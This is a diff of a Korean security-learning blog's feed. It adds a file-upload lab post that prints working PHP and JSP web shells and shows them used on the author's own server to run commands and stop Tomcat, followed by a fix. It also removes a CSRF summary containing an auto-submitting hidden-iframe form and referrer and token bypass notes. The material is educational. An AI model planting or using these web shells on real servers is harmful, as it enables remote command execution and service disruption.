@@ -1,4 +1,126 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-30T22:04:46+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">로그인 페이지 Reflected XSS 취약점</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/" rel="alternate" type="text/html" title="로그인 페이지 Reflected XSS 취약점" /><published>2023-05-30T00:00:00+09:00</published><updated>2023-05-30T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/"><![CDATA[<h2 id="취약점-발견-위치">취약점 발견 위치</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-31T22:04:51+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">File Upload 취약점 실습</title><link href="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51/" rel="alternate" type="text/html" title="File Upload 취약점 실습" /><published>2023-05-31T00:00:00+09:00</published><updated>2023-05-31T23:13:00+09:00</updated><id>http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51</id><content type="html" xml:base="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B51/"><![CDATA[<h2 id="file-upload-취약점이란">File Upload 취약점이란?</h2>
+<ul>
+  <li>파일 업로드 기능의 취약점을 이용하여 악의적인 파일(웹쉘)을 업로드한다. 이러한 업로드를 통해 서버의 시스템 권환을 장악할 수 있다.</li>
+  <li>공격자가 악성 파일을 업로드하고 공격자가 url 링크를 통해 공격자가 올린 파일에 접속이 가능할 때 발생하는 공격법이다.</li>
+  <li>웹 쉘 파일을 서버로 업로드하여 공격자는 시스템 내부의 명령을 수행할 수 있다.</li>
+</ul>
+
+<h2 id="취약점-발생-위치">취약점 발생 위치</h2>
+<ul>
+  <li>파일 업로드가 가능한 곳</li>
+  <li>게시글<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b77c359-86b1-455e-a7c2-015d229ab7bb" alt="Pasted image 20230531170442" /></li>
+</ul>
+
+<h2 id="웹-쉘">웹 쉘</h2>
+<ul>
+  <li>웹 서비스를 구동하기 위한 웹서버 환경에서 지원 가능한 웹 애플리케이션 언어를 기반으로 동작되는 파일을 의미한다.</li>
+  <li>외부망에 있는 공격자가 시스템 내부 명령을 수행을 하기 위한 목적으로 사용된다.</li>
+</ul>
+
+<h3 id="php-스크립트-일-때">PHP 스크립트 일 때</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="jsp-스크립트-일-때">JSP 스크립트 일 때</h3>
+
+<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
+<span class="nt">&lt;%</span>
+<span class="k">try</span> <span class="o">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span>
+<span class="err"> </span> <span class="err"> </span> <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">c</span><span class="o">;</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">c</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">())!=-</span><span class="mi">1</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">);</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
+<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+<span class="o">}</span>
+<span class="nt">%&gt;</span>
+</code></pre></div></div>
+
+<h2 id="업로드-취약점-실습">업로드 취약점 실습</h2>
+<ul>
+  <li>직접 만든 웹 페이지의 업로드 부분의 취약점을 이용하여 실습하였다.</li>
+</ul>
+
+<h3 id="실습-서버-환경">실습 서버 환경</h3>
+<ul>
+  <li>nginx + tomcat ( WAS )</li>
+</ul>
+
+<h3 id="파일-업로드-위치-확인">파일 업로드 위치 확인</h3>
+<ul>
+  <li>게시글<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/20be9578-36d5-4089-b306-a7b0837fecda" alt="Pasted image 20230531170549" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/923dc625-df69-48c5-86fb-0ae5c29661ec" alt="Pasted image 20230531170615" /></li>
+</ul>
+
+<h3 id="웹-쉘-업로드-하기">웹 쉘 업로드 하기.</h3>
+<ol>
+  <li>웹 쉘 JSP 스크립트 작성하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c98cc8e-f4ee-4620-ab09-6eb6f8d91cb9" alt="Pasted image 20230531190315" /></li>
+  <li>
+    <p>파일 업로드를 위한 게시글 작성하기 및 저장하기.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/47f35ad0-7052-4aa5-b627-51f19181ab83" alt="Pasted image 20230531175551" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fcffc78a-c412-4b2b-b878-0089e3e2fec8" alt="Pasted image 20230531175622" /></p>
+  </li>
+  <li>게시글에서 파일이 잘 다운되는 것을 확인할 수 있다. 다운로드 요청 링크를 보면 get 요청의 파라미터로 파일이름과 폴더이름이 들어있는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/378b3221-c1e5-416f-ae9e-96be006e51e8" alt="Pasted image 20230531175720" /></li>
+  <li>URL을 통해 업로드한 test.jsp에 접속해 보자.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/49deb562-3906-41a7-8b8f-7fdde07f1cfd" alt="Pasted image 20230531190443" /><br /><code class="language-plaintext highlighter-rouge">http://221.27.0.6/1685527431308_110/test.jsp</code></li>
+  <li>아무런 파라미터를 안주면 null 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/31367fa8-0ac0-4960-aff7-24d322e95e75" alt="Pasted image 20230531190604" /></li>
+</ol>
+
+<h3 id="명령어-입력하기">명령어 입력하기</h3>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">http://사이트 주소/test.jsp?cmd=pwd</code> 를 통해 파일 목록을 나열할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c905b0f8-649d-4e2b-9b10-1a951a686513" alt="Pasted image 20230531201540" /></li>
+  <li>서버 버전확인하기.<br /><code class="language-plaintext highlighter-rouge">http://사이트 주소/test.jsp?cmd=cat%20/etc/issue</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ed2a602a-008e-4a09-b54c-5cbcfce1b6d4" alt="Pasted image 20230531193854" /></li>
+  <li>명령을 통해 웹 서버를 종료시켜 보자. 먼저 apache 서버인지 nginx 서버인지 확인하기.<br /><code class="language-plaintext highlighter-rouge">http://사이트 주소?cmd=service%20nginx%20status</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0cbadaee-ff57-4261-b49f-9fdf1c7518e3" alt="Pasted image 20230531203111" /></li>
+  <li>nginx 서버인 것을 확인하였다. <code class="language-plaintext highlighter-rouge">service nginx stop</code> 명령을 통해 nginx 서버를 종료시켜 보자. nginx 서버를 멈추기 위해서는 관리자 권한이 필요하다. 따라서 nginx 서버를 종료하는 것은 어려워 보인다.</li>
+  <li>톰캣 서버를 종료시켜보자. 먼저 <code class="language-plaintext highlighter-rouge">apache-tomcat-10.1.9/bin</code> 폴더에 <code class="language-plaintext highlighter-rouge">shutdown</code> 파일이 있다. 이 파일을 실행 시키면 톰캣 서버는 종료된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0ee94f88-316b-43c4-997d-175efca63c51" alt="Pasted image 20230531203806" /><br /><code class="language-plaintext highlighter-rouge">http://사이트 주소?cmd=./shutdown.sh</code></li>
+  <li>톰캣 서버가 종료되었다는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d8f5b5ba-a42f-4acc-bc2d-92b2714c7557" alt="Pasted image 20230531203923" /></li>
+</ol>
+
+<h2 id="file-upload-취약점-대응방안">File Upload 취약점 대응방안</h2>
+<ul>
+  <li>파일 업로드 저장위치를 물리적으로 분리시켜주면 된다. 즉 웹 페이지가 저장되어 있는 서버와 파일이 저장되는 서버를 분리시켜주면 된다.</li>
+  <li>파일 저장 위치를 웹 링크를 통해 접속할 수 없는 위치로 설정하여야 한다.</li>
+  <li>웹 서버의 계정의 접근 권한을 제한하는 방법도 있다.</li>
+</ul>
+
+<h2 id="웹-페이지-파일-업로드-취약점-없애기">웹 페이지 파일 업로드 취약점 없애기</h2>
+<ul>
+  <li>파일 저장 위치를 웹 URL을 통해 접속할 수 없는 장소로 설정해 주었다. 이제 웹 URL로 접속할 수 없다.</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">String</span> <span class="nf">getFilePath</span><span class="o">(</span><span class="nc">ServletRequest</span> <span class="n">request</span><span class="o">,</span><span class="nc">String</span> <span class="n">folderName</span><span class="o">){</span>
+	<span class="c1">// 업로드 폴더 존재 확인 업로드 폴더 존재안하면 만들어주기.</span>
+	<span class="c1">// 링크를 통해 접근할 수 없는 위치에 만들어주기.</span>
+	<span class="kt">var</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getRealPath</span><span class="o">(</span><span class="s">""</span><span class="o">)).</span><span class="na">getParentFile</span><span class="o">().</span><span class="na">getParent</span><span class="o">()+</span><span class="nc">File</span><span class="o">.</span><span class="na">separatorChar</span><span class="o">+</span><span class="s">"upload_folder"</span><span class="o">;</span>
+	<span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+	<span class="k">if</span><span class="o">(!</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">folder</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">()){</span>
+		<span class="n">folder</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span> <span class="c1">// 업로드 폴더 만들기.</span>
+	<span class="o">}</span>
+	<span class="n">path</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="nc">File</span><span class="o">.</span><span class="na">separsatorChar</span> <span class="o">+</span> <span class="n">folderName</span><span class="o">;</span>
+	<span class="k">return</span> <span class="n">path</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>웹 페이지에서 폴더 이름을 예측할 수 있는 가능성을 없애주었고, 게시글 번호 파라미터를 추가해주었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f378cdf7-9dea-4946-b584-1c4e3755fa9d" alt="Pasted image 20230531190443" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8b522229-9ed6-4601-95be-cd3675ba6a74" alt="Pasted image 20230531212208" /></li>
+</ul>
+
+<h2 id="후기">후기</h2>
+<ul>
+  <li>직접 웹 쉘을 작성하고 웹 서버에 업로드하여 외부에서 서버 명령어를 실행시켜 보았다. 처음에는 웹 쉘이 무엇인지 몰랐고 찾아보아도 이해가 잘안되었는데 직접 실습을 해보니 웹 쉘이 어떤것인지 감이 잡혔다. 서버에 접속하여 원하는 명령을 마음데로 실행 시켜보니 파일 업로드 취약점이 서버에 얼마나 위험한지 알 수 있었다.</li>
+</ul>
+
+<h2 id="참고-사이트">참고 사이트</h2>
+<ul>
+  <li><a href="https://haenny.tistory.com/266">윈도우 cmd 명령어 실행 : Java로 실행파일 실행시키기 응용 (tistory.com)</a></li>
+  <li><a href="https://velog.io/@jsw4215/%EB%82%B4%EA%B0%80-%EB%A7%8C%EB%93%A0-%ED%99%88%ED%8E%98%EC%9D%B4%EC%A7%80-%ED%95%B4%ED%82%B9%ED%95%98%EA%B8%B04">내가 만든 홈페이지 해킹하기(4) (velog.io)</a></li>
+  <li><a href="https://m.blog.naver.com/nahejae533/220997626311">File Upload 공격 : 네이버 블로그 (naver.com)</a></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="File Upload" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[File Upload 에 대하여 알아보고 직접 웹 쉘을 업로드 해보자.]]></summary></entry><entry><title type="html">로그인 페이지 Reflected XSS 취약점</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/" rel="alternate" type="text/html" title="로그인 페이지 Reflected XSS 취약점" /><published>2023-05-30T00:00:00+09:00</published><updated>2023-05-30T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84XSS%EC%B7%A8%EC%95%BD%EC%A0%90/"><![CDATA[<h2 id="취약점-발견-위치">취약점 발견 위치</h2>
 <ul>
   <li>직접 만든 사이트의 로그인 페이지에서 XSS 취약점을 발견하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/af4d52b7-22d7-44fe-a78d-406421828678" alt="Pasted image 20230530184238" /></li>
 </ul>
@@ -1674,134 +1796,4 @@ http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=22
   <li><a href="https://www.daleseo.com/js-window-fetch/">자바스크립트의 fetch() 함수로 원격 API 호출하기</a></li>
   <li><a href="https://velog.io/@seoltang/fetch-POST-Request">fetch 함수: POST Request (velog.io)</a></li>
   <li><a href="https://sisiblog.tistory.com/261">자바스크립트 fetch로 formdata post 보내기 (tistory.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 2번 문제를 풀어보자.]]></summary></entry><entry><title type="html">CSRF 간단한 정리</title><link href="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="CSRF 간단한 정리" /><published>2023-05-21T00:00:00+09:00</published><updated>2021-05-20T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/CSRF%EA%B0%84%EB%8B%A8%ED%95%9C%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="csrf--cross-site-request-forgery--란">CSRF ( Cross Site Request Forgery ) 란</h2>
-<ul>
-  <li>요청을 위조하는 공격이다.</li>
-  <li>피해자가 몰랐던 요청을 서버에 보내게 하는 공격이다.</li>
-  <li>피해자는 자신의 의도와는 다르게, 서버로 임이의 요청을 하게 만드는 공격이다.</li>
-  <li>피해자 세션을 활용한 공격이다.</li>
-</ul>
-
-<h2 id="발생-위치">발생 위치</h2>
-<ul>
-  <li>모든 요청에서 발생할 수 있다.</li>
-  <li>비밀번호 변경, 이메일 주소 변경, 관리자 계정 등록 등.</li>
-</ul>
-
-<h2 id="중요">중요</h2>
-<ul>
-  <li>단 피해자가 로그인을 한 채로 링크를 클릭해야 피해자 세션 정보로 요청이 보내진다.</li>
-</ul>
-
-<h2 id="공격-방법">공격 방법</h2>
-
-<h3 id="get-방식일-때">GET 방식일 때</h3>
-<ul>
-  <li>CSRF 공격이 쉬워진다.</li>
-  <li>요청을 주는 url을 만들어 사용자에게 주어 클릭하도록 만들어주면 된다.</li>
-</ul>
-
-<h3 id="post-방식일-때">POST 방식일 때</h3>
-<ol>
-  <li>가장 간단한 방법은 사용자가 클릭하게 유도하는 방법.</li>
-  <li>XSS 취약점과 CSRF 취약점을 합쳐서 공격하는 방법. 단 같은 도메인에서 두개(xss, csrf)의 취약점이 나타나야 한다.</li>
-</ol>
-
-<ul>
-  <li>iframe 을 이용하여 form post 결과를 iframe 에서 볼 수 있게 만든다. 이러면 페이지 이동은 없으면서 사용자는 자신도 모르게 요청을 보내게 된다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe width="0" height="0" border="0" name="frame" id="frame" style="display:none;"&gt;&lt;/iframe&gt;
-
-
-&lt;form method="POST" action="xxx" target="frame"&gt;
-	&lt;input&gt;
-&lt;/form&gt;
-
-&lt;script&gt;
-document.forms[0].submit();
-&lt;/script&gt;
-</code></pre></div></div>
-
-<h2 id="csrf-방어하기">CSRF 방어하기</h2>
-
-<h3 id="csrf를-referrer-로-막기">CSRF를 Referrer 로 막기</h3>
-
-<h4 id="referrer-란">Referrer 란?</h4>
-<ul>
-  <li>이 요청을 어디서 한 건지 확인하는 용도이다.</li>
-</ul>
-
-<h3 id="referrer-로-막기">Referrer 로 막기</h3>
-<ul>
-  <li>예를들어 마이페이지에서 비밀번호 변경 요청이 와야 정상 요청이다.</li>
-  <li>게시판 같은 곳에서 비밀번호 변경 요청이 오면 비정상적인 요청인 것 이다.</li>
-  <li>요청을 어디서 한 것인지 확인하여 비정상적인 요청이면 막아 CSRF 공격을 예방할 수 있다.</li>
-</ul>
-
-<h3 id="csrf-토큰을-이용하여-막기">CSRF 토큰을 이용하여 막기</h3>
-
-<h4 id="csrf-토큰-란">CSRF 토큰 란?</h4>
-<ul>
-  <li>CSRF 를 막기위해 만들어진 것 이다.</li>
-  <li>서버에서 CSRF 토큰을 발행하여 요청이 발생하는 페이지에 몰래 넣어둔다.</li>
-  <li>사용자가 요청을 보내면 토큰 값도 같이 요청의 파라미터로 보내진다.</li>
-</ul>
-
-<h4 id="csrf-토큰으로-막기">CSRF 토큰으로 막기</h4>
-<ul>
-  <li>사용자가 요청한 토큰 값과 서버에 저장된 토큰 값이 일치해야 정상적인 요청이라 판단한다.</li>
-  <li>따라서 공격자는 서버에서 발행하는 CSRF 토큰을 알 수가 없어 CSRF 공격을 성공시킬 수 없다.</li>
-</ul>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"~~"</span><span class="nt">&gt;</span>
-... 생략 ...
-<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">value=</span><span class="s">"csrf 토큰"</span><span class="nt">&gt;</span>
-... 생략 ...
-<span class="nt">&lt;/form&gt;</span>
-</code></pre></div></div>
-
-<h2 id="우회-방법">우회 방법</h2>
-<h3 id="referrer-check-bypass">Referrer Check Bypass</h3>
-<ul>
-  <li>referrer 헤더 체크 동작방식이 다음과 같으면 referrer 헤더를 없애서 검사를 우회할 수 있다.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>만약 referrer 헤더가 존재하면
-	검사시작
-없으면
-	그냥 패스
-</code></pre></div></div>
-
-<ul>
-  <li>다음 방법으로 referrer 헤더를 없앨 수 있다.</li>
-</ul>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span><span class="nt">&gt;</span>
-</code></pre></div></div>
-
-<h3 id="csrf-토큰-bypass">CSRF 토큰 Bypass</h3>
-<ul>
-  <li>XSS 취약점을 이용하여야 한다.</li>
-  <li>먼저 토큰을 발행하는 페이지를 찾는다.</li>
-  <li><code class="language-plaintext highlighter-rouge">iframe</code> 을 활용해 준다. 토큰 발행 페이지를 iframe을 통해 불러오고, iframe 에 접근하여 토큰을 파싱해 온다.</li>
-  <li>토큰과 같이 요청을 서버로 보내면 공격성공이다. 서버는 CSRF 토큰을 보고 정상적인 요청이라 판단한다.</li>
-</ul>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"csrf 토큰을 발행하는 페이지"</span><span class="nt">&gt;</span> <span class="nt">&lt;/iframe&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="nx">iframe</span> <span class="nx">접근하여</span> <span class="nx">csrf</span> <span class="nx">토큰을</span> <span class="nx">파싱해서</span> <span class="nx">가지고</span> <span class="nx">온다</span><span class="p">.</span>
-<span class="nt">&lt;/script&gt;</span>
-</code></pre></div></div>
-
-<h2 id="xss-와-csrf-차이점">XSS 와 CSRF 차이점</h2>
-
-<h3 id="csrf">CSRF</h3>
-<ul>
-  <li>피해자가 자신도 모르게 서버로 임이의 요청을 보내게 하는 공격이다.</li>
-</ul>
-
-<h3 id="xss">XSS</h3>
-<ul>
-  <li>클라이언트 측 스크립트를 삽입하는 공격이다.</li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 란 무엇일까.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="CSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[CSRF 실습 2번 문제를 풀어보자.]]></summary></entry></feed>
